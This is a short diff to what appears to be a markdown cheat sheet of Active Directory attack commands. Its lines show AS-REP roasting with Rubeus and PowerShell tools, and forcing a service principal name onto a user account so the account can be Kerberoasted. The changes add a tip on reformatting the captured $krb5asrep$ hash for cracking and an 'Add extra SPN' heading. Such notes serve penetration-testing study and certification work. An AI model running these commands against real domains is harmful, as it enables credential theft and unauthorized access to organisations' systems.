@@ -36,6 +36,7 @@ Get-ASREPHash -UserName VPN1user -Verbose
 ```powershell
  .\Rubeus.exe asreproast /user:adunn /nowrap
 ```
+- We need to insert `23` after the `$krb5asrep$` for above.
 
 ```powershell
 Invoke-ASREPRoast -Verbose
@@ -77,7 +78,7 @@ __Force set SPN__
 Set-DomainObject -Identity support1user 
 -Set @{serviceprincipalname=‘dcorp/whatever1'}
 ```
-
+__Add extra SPN__
 ```powershell
 Set-ADUser -Identity support1user 
 -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
